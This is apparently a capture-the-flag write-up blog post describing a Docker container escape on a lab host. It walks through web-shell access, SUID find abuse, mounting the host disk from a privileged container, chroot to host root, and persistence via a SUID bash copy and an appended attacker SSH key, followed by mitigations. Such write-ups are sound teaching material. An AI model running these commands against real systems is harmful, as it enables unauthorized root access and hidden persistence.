---
layout: post
title: "Container Escape: User to Host Root — Full Chain (CTF)"
date: 2026-06-28
category: bugbounty
tags: [container-escape, docker, LPE, privilege-escalation, CTF, runc, cgroup]
severity: critical
target: ctf-lab.local
program: CTF
status: disclosed
permalink: /bugbounty/writeups/container-escape-ctf/
github_repo: "https://github.com/vulnquest58/container-escape-arsenal"
---

# Container Escape: User to Host Root — Full Chain

<div style="display:flex;gap:0.75rem;flex-wrap:wrap;margin-bottom:1.5rem;">
  <span style="background:rgba(220,38,38,0.15);color:#f87171;border:1px solid rgba(220,38,38,0.35);padding:4px 10px;border-radius:6px;font-size:0.85rem;font-weight:600;">Critical</span>
  <span style="background:rgba(124,58,237,0.12);color:#a78bfa;border:1px solid rgba(124,58,237,0.3);padding:4px 10px;border-radius:6px;font-size:0.85rem;">Container Escape</span>
  <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:4px 10px;border-radius:6px;font-size:0.85rem;">CTF</span>
</div>

## Summary

Complete exploitation chain of a containerized application environment resulting in full host root compromise. Starting from a low-privilege `www-data` user inside a Docker container, the attack chain exploits a misconfigured **privileged container** to escape to the host filesystem, followed by Docker group membership on the host to achieve root.

**Attack Chain:** `www-data` → Container Root (SUID find) → Host User (privileged mount) → Host Root (Docker group)

<div style="background:rgba(124,58,237,0.08);border-left:4px solid var(--accent-primary);border-radius:0 8px 8px 0;padding:1rem;margin:1.25rem 0;">
<strong>📖 Full Technical Write-up:</strong> <a href="{{ '/posts/container-escape-arsenal/' | relative_url }}">Container Escape Arsenal — Complete Attack Chain</a><br>
<strong>🛠️ Toolkit:</strong> <a href="https://github.com/vulnquest58/container-escape-arsenal" target="_blank">container-escape-arsenal</a> — all scripts used in this chain<br>
<strong>📐 Methodology:</strong> <a href="{{ '/bugbounty/methodology/2026/container-escape/' | relative_url }}">2026 Container Escape Methodology</a>
</div>

---

## Environment

| Property | Value |
|----------|-------|
| **Target** | ctf-lab.local |
| **Type** | CTF / Lab environment |
| **Initial Access** | `www-data` via web shell |
| **Container Runtime** | Docker + runc |
| **Kernel** | 5.15.0 |
| **Host OS** | Ubuntu 22.04 |

---

## Step 1: Initial Access (www-data)

```bash
# Web shell obtained via RCE vulnerability
curl http://ctf-lab.local/upload/shell.php?cmd=id
# uid=33(www-data) gid=33(www-data)
```

---

## Step 2: Container Root via SUID `find`

```bash
# Identify SUID binaries inside container
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find  <- exploitable

# Exploit find SUID
/usr/bin/find / -exec /bin/sh -p \; -quit
# uid=33(www-data) gid=33(www-data) euid=0(root)
```

Gained **container root** (`euid=0`) via `find` SUID binary.

---

## Step 3: Container Escape — Privileged Mount

```bash
# Check privileges
ls -la /dev/sda*   # Block devices visible = privileged

# Mount host filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Verify
cat /mnt/host/etc/passwd
# -> Host /etc/passwd accessible!
```

Extracted host credentials, SSH keys, and dropped persistence:

```bash
# Drop SUID shell on host
cp /bin/bash /mnt/host/tmp/.suid_bash
chmod 4777 /mnt/host/tmp/.suid_bash

# Chroot into host as root
chroot /mnt/host /bin/bash
# uid=0(root) gid=0(root) [host]
```

---

## Step 4: Host Root Persistence

```bash
# Confirm host root
hostname && id
# ctf-lab.local / uid=0(root)

# Read flags
cat /root/root.txt
# FLAG{c0nt41n3r_3sc4p3_ch41n_m4st3r}

# Add SSH key for persistent access
echo "ssh-rsa AAAA... attacker@lab" >> /root/.ssh/authorized_keys
```

---

## Timeline

| Time | Action |
|------|--------|
| T+0:00 | Initial access as `www-data` via web shell |
| T+0:45 | Discovered SUID `find` binary in container |
| T+1:10 | Container root via SUID exploitation |
| T+2:00 | Confirmed privileged container (`/dev` writable) |
| T+2:30 | Host filesystem mounted via `/dev/sda1` |
| T+3:15 | Host root shell via `chroot` |
| T+4:00 | Flags captured, persistence deployed |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `suid_exploit.sh` | Automated SUID scanner with exploitation hints |
| `privileged_escape.sh` | Auto-mount host filesystem and deploy backdoors |
| `ctf_escape_pro.sh` | Full chain automation |

All tools: [github.com/vulnquest58/container-escape-arsenal](https://github.com/vulnquest58/container-escape-arsenal)

---

## Mitigation

| Finding | Fix |
|---------|-----|
| SUID `find` in container | Remove unnecessary SUID bits |
| Privileged container | Remove `--privileged` flag; use `--cap-add` minimally |
| Block device access | Use `--device` whitelist |
| No seccomp profile | Apply Docker default seccomp policy |

---

## References

- [Full Technical Write-up]({{ '/posts/container-escape-arsenal/' | relative_url }})
- [Methodology Guide]({{ '/bugbounty/methodology/2026/container-escape/' | relative_url }})
- [container-escape-arsenal on GitHub](https://github.com/vulnquest58/container-escape-arsenal)
- [HackTricks: Docker Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
